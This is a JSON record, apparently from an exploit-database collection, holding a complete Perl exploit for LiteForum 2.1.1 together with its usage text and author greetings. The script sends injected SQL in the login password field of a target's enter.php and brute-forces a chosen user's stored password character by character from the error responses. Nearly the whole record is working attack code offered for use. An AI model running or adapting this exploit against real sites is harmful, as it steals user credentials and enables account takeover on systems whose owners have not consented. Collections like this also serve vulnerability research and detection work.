{
  "id": "786",
  "title": "LiteForum 2.1.1 - SQL Injection",
  "cve": null,
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n\r\nuse LWP::UserAgent;\r\n\r\n## LiteForum 2.1.1 (http://www.softtime.ru) \r\n## sql injection exploit\r\n## work on all mysql versions\r\n## by 1dt.w0lf\r\n## RusH security team (http://rst.void.ru)\r\n## ---------------------------------------\r\n## greets 2: \r\n## ghc (www.ghc.ru)\r\n## Gh0st Security Team (http://gst.void.ru) heya Ch0ke7 and off couse \"re ine\" ;)\r\n## 0xdeadbabe Security Research (0xdeadbabe.blackhatz.info)\r\n## 10x to cr0n for idea abour kewl haxor \"username\" =)))\r\n\r\n$path   = $ARGV[0];\r\n$userid = $ARGV[1];\r\n\r\n$|++;\r\n$s_num = 1;\r\n\r\nif (@ARGV < 2) { &usage; }\r\nif ($ARGV[1]=~/[^0-9]/) { print \"stupid! \\\"\".$ARGV[1].\"\\\" is not number!\"; exit(); }\r\nprint \" Please wait...\\r\\n\";\r\nprint \" Progress : [\";\r\n\r\nwhile(1)\r\n{\r\nif(&found(47,58)==0) { &found(96,122); } \r\nif ($i==\"0\") \r\n { \r\n if(length($allchar)>0)\r\n {\r\n print qq|] \r\n\r\n   USER_ID: $userid\r\n USER_PASS: $allchar\r\n |;\r\n }\r\n else\r\n {\r\n print qq|]\r\n Forum not vulnerable or user ID is incorrect|;\r\n }\r\n \r\n exit(); \r\n \r\n \r\n }\r\nelse \r\n { \r\n print \"#\"; \r\n $allchar .= chr($i); \r\n }\r\n$s_num++;\r\n}\r\n\r\nsub found($$)\r\n {\r\n my $fmin = $_[0];\r\n my $fmax = $_[1];\r\n if (($fmax-$fmin)<5) { $i=crack($fmin,$fmax); return $i; }\r\n \r\n $r = int($fmax - ($fmax-$fmin)/2);\r\n $check = \" BETWEEN $r AND $fmax\";\r\n if ( &check($check) ) { &found($r,$fmax); }\r\n else { &found($fmin,$r); }\r\n }\r\n \r\nsub crack($$)\r\n {\r\n my $cmin = $_[0];\r\n my $cmax = $_[1];\r\n $i = $cmin;\r\n while ($i<$cmax)\r\n  {\r\n  $crcheck = \"=$i\";\r\n  if ( &check($crcheck) ) { return $i; }\r\n  $i++;\r\n  }\r\n $i = 0;\r\n return $i;\r\n }\r\n \r\nsub check($)\r\n {\r\n $n++;\r\n $ccheck = $_[0];\r\n \r\n $lite_f = LWP::UserAgent->new() or die;\r\n $res = $lite_f->post(\"$path\",\r\n [\r\n \"author\" => \"i_am_kewl_hakka_FATAL_ERROR_blyat\\\\\",\r\n \"pswrd\"  => \" OR (id_author=\".$userid.\" AND (ascii(substring(passw,\".$s_num.\",1))\".$ccheck.\")) /*\"\r\n ] \r\n ); \r\n @results = $res->content; \r\n \r\n foreach $result(@results)\r\n  {\r\n  #print $result.\"\\r\\n\";\r\n  if ($result =~ /Error/) { return 1; }\r\n  }\r\n return 0;\r\n }\r\n \r\nsub usage {\r\n print q|\r\n ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n LiteForum 2.1.1 sql injection exploit with one char bruteforce\r\n           by RusH security team (www.rst.void.ru)\r\n ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n Usage: r57lite211.pl [path] [id]                   \r\n  \r\n [path] - path to enter.php (http://host.com/forum/enter.php)\r\n [id]   - user ID to bruteforce (1,2,3...)\r\n ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n |; \r\n exit();\r\n}\r\n\r\n# milw0rm.com [2005-02-04]",
  "url": "https://www.exploit-db.com/exploits/786"
}